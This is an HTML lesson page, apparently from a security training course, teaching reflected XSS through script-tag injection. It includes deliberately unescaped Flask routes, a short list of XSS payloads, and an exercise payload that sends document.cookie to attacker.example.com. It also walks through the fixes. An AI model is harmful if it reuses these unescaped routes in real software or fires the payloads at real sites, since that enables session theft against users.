@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Module 04 — Script Tag Injection | XSS Mastery</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=Lato:wght@300;400;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root{--bg:#0b0f1a;--bg2:#111827;--bg3:#1a2235;--card:#141c2e;--border:#1e3a5f;
+          --gold:#f5c842;--cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;--green:#4ade80;
+          --teal:#0d9488;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:16px;line-height:1.75}
+    .page-wrap{max-width:860px;margin:0 auto;padding:48px 24px 96px}
+    .mod-badge{display:inline-block;font-size:11px;font-weight:700;letter-spacing:.14em;
+               text-transform:uppercase;color:var(--muted);border:1px solid var(--border);
+               border-radius:4px;padding:4px 10px;margin-bottom:20px}
+    h1{font-family:'Playfair Display',serif;font-size:42px;color:var(--gold);line-height:1.2;margin-bottom:12px}
+    h2{font-family:'Playfair Display',serif;font-size:26px;color:var(--cyan);
+       margin:52px 0 16px;padding-top:8px;border-top:1px solid var(--border)}
+    h3{font-family:'Lato',sans-serif;font-size:18px;font-weight:700;color:var(--purple);margin:32px 0 10px}
+    h4{font-size:14px;font-weight:700;color:var(--orange);margin:20px 0 6px;
+       text-transform:uppercase;letter-spacing:.06em}
+    .subtitle{font-size:17px;color:var(--muted);margin-bottom:40px;line-height:1.5}
+    p{margin-bottom:18px}
+    strong{color:var(--text);font-weight:700}
+    em{color:var(--orange);font-style:normal;font-weight:600}
+    a{color:var(--cyan)}
+    ul,ol{padding-left:22px;margin-bottom:18px}
+    li{margin-bottom:6px}
+    .prereq-bar{background:var(--card);border:1px solid var(--border);border-left:4px solid var(--teal);
+                border-radius:6px;padding:16px 20px;margin-bottom:32px}
+    .prereq-bar strong{color:var(--teal);font-size:12px;text-transform:uppercase;
+                       letter-spacing:.1em;display:block;margin-bottom:6px}
+    .prereq-bar p{font-size:14px;color:var(--muted);margin:0}
+    .deliverables{background:var(--bg3);border:1px solid var(--border);border-radius:6px;
+                  padding:20px 24px;margin-bottom:36px}
+    .deliverables strong{color:var(--gold);font-size:13px;text-transform:uppercase;
+                         letter-spacing:.1em;display:block;margin-bottom:12px}
+    .deliverables ul{list-style:none;padding:0}
+    .deliverables li{font-size:14px;padding:4px 0 4px 20px;position:relative}
+    .deliverables li::before{content:"→";position:absolute;left:0;color:var(--green);font-weight:700}
+    .callout{border-radius:6px;padding:16px 20px;margin:28px 0;font-size:14.5px;line-height:1.65}
+    .callout .callout-label{font-size:11px;font-weight:700;letter-spacing:.12em;
+                             text-transform:uppercase;margin-bottom:8px;display:block}
+    .callout.warning{background:#1f0f0f;border-left:4px solid var(--red)}
+    .callout.warning .callout-label{color:var(--red)}
+    .callout.tip{background:#0a1f13;border-left:4px solid var(--green)}
+    .callout.tip .callout-label{color:var(--green)}
+    .callout.insight{background:#0f1240;border-left:4px solid var(--purple)}
+    .callout.insight .callout-label{color:var(--purple)}
+    .callout.info{background:#061826;border-left:4px solid var(--cyan)}
+    .callout.info .callout-label{color:var(--cyan)}
+    pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;
+        padding:20px;overflow-x:auto;margin:20px 0;
+        font-family:'Source Code Pro',monospace;font-size:13.5px;line-height:1.7}
+    code{font-family:'Source Code Pro',monospace;font-size:13px}
+    p code,li code{background:var(--code-bg);color:var(--cyan);padding:2px 6px;
+                   border-radius:3px;border:1px solid var(--border)}
+    .cm{color:#4b5563}.kw{color:#89dceb}.fn{color:#a78bfa}
+    .st{color:#a6e3a1}.nu{color:#fab387}.at{color:#f5c842}.op{color:#f87171}
+    .hl{color:#f5c842;font-weight:700}
+    .steps{list-style:none;counter-reset:step;margin:20px 0;padding:0}
+    .steps li{counter-increment:step;padding:14px 16px 14px 56px;position:relative;
+              background:var(--card);border:1px solid var(--border);border-radius:6px;
+              margin-bottom:10px;font-size:14.5px}
+    .steps li::before{content:counter(step);position:absolute;left:16px;top:14px;
+                      width:24px;height:24px;border-radius:50%;background:var(--border);
+                      color:var(--cyan);font-weight:700;font-size:12px;
+                      display:flex;align-items:center;justify-content:center}
+    .exercise{background:var(--card);border:1px solid var(--border);
+              border-radius:6px;padding:20px 24px;margin-bottom:14px}
+    .exercise .ex-badge{font-size:10px;font-weight:700;letter-spacing:.1em;
+                        text-transform:uppercase;padding:2px 8px;border-radius:3px;
+                        margin-bottom:10px;display:inline-block}
+    .ex-warm .ex-badge{background:#1a2f1a;color:var(--green)}
+    .ex-core .ex-badge{background:#1a1a2f;color:var(--cyan)}
+    .ex-stretch .ex-badge{background:#2f1a2f;color:var(--purple)}
+    .exercise h4{margin-top:0}
+    .exercise p{font-size:14.5px;margin-bottom:8px}
+    .exercise ul{padding-left:20px;font-size:14px}
+    .exercise li{margin-bottom:4px}
+    .next-box{background:var(--bg3);border:1px solid var(--border);
+              border-left:4px solid var(--gold);border-radius:6px;
+              padding:22px 24px;margin-top:48px}
+    .next-box strong{color:var(--gold);display:block;font-size:12px;text-transform:uppercase;
+                     letter-spacing:.1em;margin-bottom:10px}
+    .file-block{background:var(--bg2);border:1px solid var(--border);
+                border-radius:6px;margin:24px 0;overflow:hidden}
+    .file-block-header{background:var(--card);padding:10px 16px;
+                       font-family:'Source Code Pro',monospace;font-size:13px;
+                       color:var(--gold);border-bottom:1px solid var(--border)}
+    .file-block pre{margin:0;border:none;border-radius:0}
+    .attack-flow{display:flex;align-items:center;gap:0;margin:24px 0;flex-wrap:wrap}
+    .flow-step{background:var(--card);border:1px solid var(--border);border-radius:6px;
+               padding:12px 14px;font-size:12.5px;flex:1;min-width:120px;text-align:center}
+    .flow-step .fn{display:block;font-weight:700;font-size:13px;margin-bottom:3px}
+    .flow-arrow{color:var(--muted);font-size:18px;padding:0 4px;flex-shrink:0}
+    .top-nav{background:var(--bg2);border-bottom:1px solid var(--border);
+             padding:12px 24px;display:flex;align-items:center;
+             justify-content:space-between;font-size:13px;color:var(--muted)}
+    .top-nav a{color:var(--cyan);text-decoration:none}
+    hr{border:none;border-top:1px solid var(--border);margin:40px 0}
+    table{width:100%;border-collapse:collapse;margin:20px 0;font-size:14px}
+    th{background:var(--card);color:var(--cyan);padding:10px 14px;
+       text-align:left;border-bottom:1px solid var(--border)}
+    td{padding:10px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    tr:last-child td{border-bottom:none}
+  </style>
+</head>
+<body>
+
+<nav class="top-nav">
+  <a href="/">← Lab Home</a>
+  <span>XSS Mastery Course</span>
+  <span>Module 04 of 19</span>
+</nav>
+
+<div class="page-wrap">
+
+  <div class="mod-badge">Module 04 of 19</div>
+  <h1>Script Tag Injection:<br>Mechanism 1 in Depth</h1>
+  <p class="subtitle">
+    The oldest and most straightforward execution mechanism. The browser sees a
+    <code>&lt;script&gt;</code> tag, hands its content to the JavaScript engine,
+    and executes it immediately. Understanding this baseline precisely — when it
+    works, when it doesn't, and why — is the foundation for everything that follows.
+  </p>
+
+  <div class="prereq-bar">
+    <strong>Prerequisites</strong>
+    <p>Modules 01–03 complete. You know the five mechanisms and the four injection
+       contexts. Burp Suite is installed and proxying Chrome.</p>
+  </div>
+
+  <div class="deliverables">
+    <strong>What you will build in this module</strong>
+    <ul>
+      <li>Three vulnerable server endpoints: body, attribute, and script injection contexts</li>
+      <li>An interactive attack demo page (<code>attack_01_script.html</code>) with seven payload variants</li>
+      <li>Hands-on experience firing reflected XSS in all three contexts via Burp Suite</li>
+      <li>A mental model of the full reflected XSS attack chain — from URL to victim's browser</li>
+    </ul>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Concept 1 — What "Reflected" Means and Why It Matters</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    A reflected XSS vulnerability exists when a server takes a value from an
+    HTTP request — a URL parameter, a form field, a header — and includes it
+    verbatim in the HTML response without encoding it. The payload is
+    <em>reflected</em>: the server sends back what you gave it, as part of
+    the page. The browser then parses that page, encounters the injected code,
+    and executes it.
+  </p>
+
+  <p>
+    The attack chain has five steps. Every one of them matters for threat
+    modelling, because each step is a potential intervention point:
+  </p>
+
+  <div class="attack-flow">
+    <div class="flow-step"><span class="fn" style="color:var(--red)">1. Craft</span>Attacker builds malicious URL with payload in parameter</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step"><span class="fn" style="color:var(--orange)">2. Deliver</span>Victim receives URL (email, chat, QR code, shortened link)</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step"><span class="fn" style="color:var(--gold)">3. Request</span>Victim's browser sends GET request to target server</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step"><span class="fn" style="color:var(--cyan)">4. Reflect</span>Server embeds payload in HTML response without encoding</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step"><span class="fn" style="color:var(--purple)">5. Execute</span>Browser parses response, script runs in victim's session</div>
+  </div>
+
+  <p>
+    Notice that the attacker never has to compromise the server. The server is
+    an unwilling participant that faithfully serves the attacker's payload back
+    to the victim. The victim's browser executes it because it came from the
+    trusted server's origin. This is why Same-Origin Policy, the browser's
+    primary access control mechanism, provides no protection — the code is on
+    the right origin. It was put there by the attacker, but the browser can't
+    know that.
+  </p>
+
+  <div class="callout insight">
+    <span class="callout-label">PhD Insight — Reflected XSS Is Still Ubiquitous</span>
+    Despite being the oldest and most well-understood XSS class, reflected XSS
+    consistently appears in bug bounty programmes and CVE reports. The reason is
+    structural: every web application has search boxes, error pages, redirect
+    parameters, and form prefills — all of which reflect user input. A single
+    missed encoding call anywhere in a large codebase creates a vulnerability.
+    The 2021 OWASP Top 10 places injection (which includes XSS) at #3. The
+    volume of reflected XSS in the wild motivates your research question: existing
+    defences are clearly insufficient for real-world adoption at scale.
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Concept 2 — The Three Injection Contexts for Script Execution</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    Script-tag injection always begins with identifying the injection context —
+    where in the HTML document your input lands. Each context requires a
+    different technique to reach executable code.
+  </p>
+
+  <h3>Body Context: Direct Tag Injection</h3>
+  <p>
+    The attacker's input appears directly in the document body:
+    <code>&lt;p&gt;Results for: [INPUT]&lt;/p&gt;</code>.
+    A <code>&lt;</code> character here starts a new tag immediately. The simplest
+    possible injection is a complete script tag:
+    <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. No preamble, no escaping,
+    no setup. The browser sees the opening script tag, reads until the closing
+    tag, and hands the content to the JS engine.
+  </p>
+  <p>
+    Variations: the script tag can load a remote file (<code>src=</code>),
+    use upper-case (<code>&lt;SCRIPT&gt;</code>), or be preceded by a closing
+    tag that escapes a different context (<code>&lt;/title&gt;</code>,
+    <code>&lt;/style&gt;</code>).
+  </p>
+
+  <h3>Script Context: Breaking Out of a JS String</h3>
+  <p>
+    The attacker's input is embedded inside a <code>&lt;script&gt;</code> block
+    as a string literal:
+    <code>var q = "[INPUT]";</code>. The attacker cannot inject a new
+    <code>&lt;script&gt;</code> tag here — they are already inside one. Instead,
+    there are two escape routes:
+  </p>
+  <ul>
+    <li>
+      <strong>String break:</strong> inject a <code>"</code> to close the string,
+      then arbitrary JS, then <code>//</code> to comment out the rest:
+      <code>"; alert(1);//</code>
+    </li>
+    <li>
+      <strong>Tag break:</strong> inject <code>&lt;/script&gt;</code> — the HTML
+      parser closes the script block immediately even if the JS tokeniser is in
+      the middle of a string literal. The browser parses HTML before parsing JS.
+    </li>
+  </ul>
+
+  <h3>Attribute Context: Breaking Into the Tag Body</h3>
+  <p>
+    The attacker's input is inside a quoted HTML attribute:
+    <code>&lt;input value="[INPUT]"&gt;</code>. Injecting <code>"</code> closes
+    the attribute, and the attacker is now in the tag body, where they can add
+    event handlers. The trailing part of the original attribute becomes an
+    attribute of its own (absorbed by <code>x="</code>):
+  </p>
+  <pre><span class="cm">// Template:       &lt;input value="[INPUT]"&gt;
+// Injected value: " onmouseover="alert(1)" x="
+// Result:         &lt;input value="" onmouseover="alert(1)" x=""&gt;</span></pre>
+
+  <div class="callout tip">
+    <span class="callout-label">Tip — Always Identify Context Before Choosing Payload</span>
+    The single most common mistake made by developers trying to fix XSS is
+    applying the wrong type of encoding for the context. HTML-encoding
+    <code>&lt;</code> and <code>&gt;</code> stops body-context injection but
+    does nothing to prevent attribute-context injection (the attacker uses
+    <code>"</code>, not <code>&lt;</code>). Script-context injection requires
+    JavaScript-aware encoding, not HTML encoding. The three endpoints in this
+    module let you experience each context independently — this trains the
+    instinct to identify context before acting.
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Concept 3 — The innerHTML Exception: A Critical Constraint</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    When you assign a string containing a <code>&lt;script&gt;</code> tag to
+    <code>element.innerHTML</code>, the script tag is parsed into a DOM element
+    but <em>not executed</em>. This is mandated by the HTML5 specification
+    (Section 8.4.1): script elements created by the innerHTML setter are marked
+    "already started" by the tree builder and the JS engine skips them.
+  </p>
+
+  <p>
+    This constraint is why DOM XSS (Module 09) uses <em>event handlers</em>
+    injected via innerHTML, not script tags. <code>&lt;img src=x onerror=alert(1)&gt;</code>
+    assigned via innerHTML <em>does</em> execute — the onerror handler is not
+    subject to the same restriction. This asymmetry is important to understand:
+    when evaluating a DOM XSS sink, the question is not "can a script tag
+    execute here?" but "can an event handler execute here?" The answer is almost
+    always yes for any HTML-parsing sink.
+  </p>
+
+  <div class="callout warning">
+    <span class="callout-label">Warning — The innerHTML Exception Creates False Confidence</span>
+    Developers who discover that <code>el.innerHTML = userInput</code> doesn't
+    execute script tags sometimes conclude that it is therefore safe. It is not.
+    Event handlers, <code>onload</code> on images, <code>onerror</code> on
+    broken resources, <code>javascript:</code> URIs in href attributes — all
+    execute via innerHTML. The only safe DOM property for displaying arbitrary
+    text is <code>textContent</code>, which never parses HTML.
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Concept 4 — Reading HTTP Responses with Burp Suite</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <p>
+    Burp Suite's Repeater tool is the most important instrument for studying
+    reflected XSS. It lets you modify a request and immediately see the raw
+    HTTP response — the exact bytes the server sent before the browser parses
+    them. This is crucial because:
+  </p>
+  <ul>
+    <li>The browser's DevTools Elements panel shows you the <em>parsed DOM</em>, not the raw HTML. They differ.</li>
+    <li>Burp shows you exactly where your input landed in the response and what surrounds it.</li>
+    <li>You can test dozens of payload variations in seconds without writing URLs by hand.</li>
+    <li>The response headers are visible — CSP, X-Content-Type-Options, Set-Cookie flags — telling you what defences exist.</li>
+  </ul>
+
+  <p>
+    The workflow: navigate to a target URL in Chrome with Burp proxying → find the
+    request in Burp's HTTP History → right-click → Send to Repeater → modify the
+    payload in the request → Send → inspect the response. This is the workflow
+    used for every module from here onward.
+  </p>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Code Walkthrough — lab_server.py /search</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <div class="file-block">
+    <div class="file-block-header">lab_server.py — /search route</div>
+    <pre><span class="at">@app.route</span>(<span class="st">"/search"</span>)
+<span class="kw">def</span> <span class="fn">search</span>():
+    <span class="cm"># request.args.get() reads the URL query string.
+    # ?q=hello  →  q = "hello"
+    # ?q=&lt;script&gt;alert(1)&lt;/script&gt;  →  q = "&lt;script&gt;alert(1)&lt;/script&gt;"
+    # Flask does NOT decode HTML entities — the value is the raw URL-decoded string.</span>
+    q = request.args.<span class="fn">get</span>(<span class="st">"q"</span>, <span class="st">""</span>)
+
+    <span class="cm"># THE VULNERABILITY: q is f-string interpolated directly into HTML.
+    #
+    # The safe alternative is one of:
+    #   import html; html.escape(q)          ← HTML-encode for body context
+    #   flask.escape(q)                      ← same, Flask helper
+    #   use render_template() with Jinja2    ← auto-escapes by default
+    #
+    # We deliberately avoid all of these so payloads execute.</span>
+    body = <span class="st">f"""
+  &lt;div class="box"&gt;
+    &lt;label&gt;Results for:&lt;/label&gt;
+    &lt;div id="query-echo"&gt;<span class="hl">{q}</span>&lt;/div&gt;   &lt;!-- INJECTION POINT --&gt;
+  &lt;/div&gt;"""</span>
+
+    resp = <span class="fn">make_response</span>(<span class="fn">page_shell</span>(<span class="st">"Search"</span>, body))
+    resp.headers[<span class="st">"Content-Type"</span>] = <span class="st">"text/html; charset=utf-8"</span>
+    <span class="cm"># No CSP, no X-XSS-Protection — bare, undefended endpoint.
+    # Module 17 adds these headers to the SAFE versions of these routes.</span>
+    <span class="kw">return</span> resp</pre>
+  </div>
+
+  <div class="file-block">
+    <div class="file-block-header">lab_server.py — /search-js route (script context)</div>
+    <pre><span class="at">@app.route</span>(<span class="st">"/search-js"</span>)
+<span class="kw">def</span> <span class="fn">search_js</span>():
+    q = request.args.<span class="fn">get</span>(<span class="st">"q"</span>, <span class="st">""</span>)
+
+    <span class="cm"># The injected value lands inside a JS string literal.
+    # To safely embed user data in a JS context, use json.dumps():
+    #   import json
+    #   safe_q = json.dumps(q)   # adds quotes + escapes " \ and &lt;/
+    # We skip this to preserve the vulnerability.</span>
+    body = <span class="st">f"""
+  &lt;script&gt;
+    var searchQuery = "<span class="hl">{q}</span>";    // &lt;-- INJECTION POINT
+    document.getElementById('result').textContent =
+      'You searched for: ' + searchQuery;
+  &lt;/script&gt;"""</span>
+    <span class="kw">return</span> <span class="fn">make_response</span>(<span class="fn">page_shell</span>(<span class="st">"Search JS"</span>, body),
+                          <span class="nu">200</span>, {<span class="st">"Content-Type"</span>: <span class="st">"text/html; charset=utf-8"</span>})</pre>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Build &amp; Run</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <ol class="steps">
+    <li>Start the server: <code>python lab_server.py</code> or <code>node lab_server.js</code></li>
+    <li>Open <a href="http://localhost:5000/attack_01_script.html" target="_blank">http://localhost:5000/attack_01_script.html</a></li>
+    <li>Work through Steps 1–6 in order. Keep DevTools Console and Elements panel open for each new tab.</li>
+    <li>For each payload: View Source (Ctrl+U) on the resulting page <em>and</em> inspect Elements panel. Note the difference.</li>
+    <li>In Burp Suite: proxy Chrome, visit <code>/search?q=test</code>, send to Repeater, swap payloads.</li>
+    <li>In Repeater: look at the raw response body. Find exactly where your input appears. What surrounds it?</li>
+  </ol>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>Exercises</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <div class="exercise ex-warm">
+    <span class="ex-badge">Warm-up</span>
+    <h4>Exercise 1 — Confirm Reflection in Burp</h4>
+    <p>
+      With Burp proxying Chrome, navigate to
+      <code>http://localhost:5000/search?q=CANARY12345</code>.
+      In Burp HTTP History, find the request. Inspect the raw response.
+      Use Ctrl+F to search for <code>CANARY12345</code> in the response body.
+      How many times does it appear? Where in the HTML does each occurrence land?
+      This technique — inserting a unique canary string and searching the
+      response — is how professional security auditors rapidly identify all
+      injection points in a target.
+    </p>
+  </div>
+
+  <div class="exercise ex-warm">
+    <span class="ex-badge">Warm-up</span>
+    <h4>Exercise 2 — Trace the Full Attack Chain</h4>
+    <p>
+      Write out the full attack chain for this payload as if you were writing
+      a bug bounty report:
+    </p>
+    <pre>&lt;script&gt;document.location='http://attacker.example.com/?c='+document.cookie&lt;/script&gt;</pre>
+    <ul>
+      <li>What does the attacker send to the victim?</li>
+      <li>What request does the victim's browser make to the lab server?</li>
+      <li>What does the server put in the HTML response?</li>
+      <li>What does the victim's browser do when it parses the response?</li>
+      <li>What request does the victim's browser make to <code>attacker.example.com</code>?</li>
+      <li>What would a real attacker do with the data in that request?</li>
+    </ul>
+  </div>
+
+  <div class="exercise ex-core">
+    <span class="ex-badge">Core</span>
+    <h4>Exercise 3 — Fix the Vulnerability</h4>
+    <p>
+      In <code>lab_server.py</code>, create a new safe route
+      <code>/search-safe</code> that does the same thing as <code>/search</code>
+      but correctly encodes output for the body context. In Python:
+    </p>
+    <pre><span class="kw">import</span> html
+safe_q = html.<span class="fn">escape</span>(q)   <span class="cm"># converts &lt; → &amp;lt;  " → &amp;quot;  etc.</span></pre>
+    <p>
+      Do the same in <code>lab_server.js</code>:
+    </p>
+    <pre><span class="kw">function</span> <span class="fn">escapeHtml</span>(str) {
+  <span class="kw">return</span> str
+    .<span class="fn">replace</span>(<span class="op">/&amp;/g</span>, <span class="st">'&amp;amp;'</span>)
+    .<span class="fn">replace</span>(<span class="op">/&lt;/g</span>, <span class="st">'&amp;lt;'</span>)
+    .<span class="fn">replace</span>(<span class="op">/&gt;/g</span>, <span class="st">'&amp;gt;'</span>)
+    .<span class="fn">replace</span>(<span class="op">/"/g</span>, <span class="st">'&amp;quot;'</span>)
+    .<span class="fn">replace</span>(<span class="op">/'/g</span>, <span class="st">'&amp;#x27;'</span>);
+}</pre>
+    <p>
+      Navigate to <code>/search-safe?q=&lt;script&gt;alert(1)&lt;/script&gt;</code>.
+      Verify the script tag is displayed as literal text, not executed.
+      Then View Source — what do you see where the payload was? Use the Elements
+      panel — how does the browser represent the encoded characters in the DOM?
+    </p>
+  </div>
+
+  <div class="exercise ex-core">
+    <span class="ex-badge">Core</span>
+    <h4>Exercise 4 — Fix the Script Context</h4>
+    <p>
+      Create a safe <code>/search-js-safe</code> route that correctly handles
+      user data embedded in a JavaScript context. The correct fix is
+      <code>json.dumps()</code> in Python or <code>JSON.stringify()</code> in
+      Node — these escape the characters that are dangerous in a JS string
+      context (<code>"</code>, <code>\</code>, and the <code>&lt;/</code>
+      sequence that closes a script block):
+    </p>
+    <pre><span class="cm"># Python</span>
+<span class="kw">import</span> json
+safe_q = json.<span class="fn">dumps</span>(q)   <span class="cm"># "hello"  →  '"hello"'
+                           # &lt;/script&gt;  →  '"&lt;\\/script&gt;"' (/ escaped)</span>
+
+<span class="cm">// Node.js</span>
+<span class="kw">const</span> safe_q = JSON.<span class="fn">stringify</span>(q);
+<span class="cm">// Then use in template: var searchQuery = ${safe_q};</span>
+<span class="cm">// Note: JSON.stringify adds its own quotes, so don't add extra quotes in the template</span></pre>
+    <p>
+      Test with <code>?q=";alert(1);//</code> — the alert should not fire.
+      Then test with a normal query like <code>?q=hello world</code> — it should
+      still display correctly.
+    </p>
+  </div>
+
+  <div class="exercise ex-stretch">
+    <span class="ex-badge">Stretch</span>
+    <h4>Exercise 5 — Burp Intruder: Automated Payload Testing</h4>
+    <p>
+      In Burp Suite, send the <code>/search?q=test</code> request to Intruder
+      (right-click → Send to Intruder). In the Positions tab, mark
+      <code>test</code> as the insertion point (highlight it → Add §).
+      In the Payloads tab, select "Simple list" and add these payloads:
+    </p>
+    <pre>&lt;b&gt;bold&lt;/b&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+" onmouseover="alert(1)" x="</pre>
+    <p>
+      Run the attack (Start Attack). In the results, look at the Response column.
+      Click each result and use the "Render" tab in Burp to see how the browser
+      would parse the response. This is how a real security auditor tests
+      multiple payload variants quickly. Note which payloads the server reflects
+      verbatim vs. which ones might be modified (even though our server doesn't
+      filter anything yet).
+    </p>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+  <h2>What's Next</h2>
+  <!-- ═══════════════════════════════════════════════════════════════════ -->
+
+  <div class="next-box">
+    <strong>Module 05 — Event Handler Injection (Mechanism 2 in Depth)</strong>
+    <p>
+      Module 04 established the baseline: script tags in the body context.
+      Module 05 confronts the reality of modern XSS: most deployments block
+      <code>&lt;script&gt;</code> in some way, yet attacks still succeed. The
+      reason is Mechanism 2 — event handler attributes. Module 05 introduces
+      <code>attack_02_events.html</code> and <code>event_catalog.html</code>,
+      a complete reference of the 40 most useful event handlers for XSS.
+      You will fire zero-interaction payloads using <code>onerror</code>,
+      <code>onload</code>, <code>ontoggle</code>, <code>onfocus</code>, and
+      more — demonstrating that blocking script tags is theatre, not defence.
+    </p>
+  </div>
+
+</div>
+</body>
+</html>
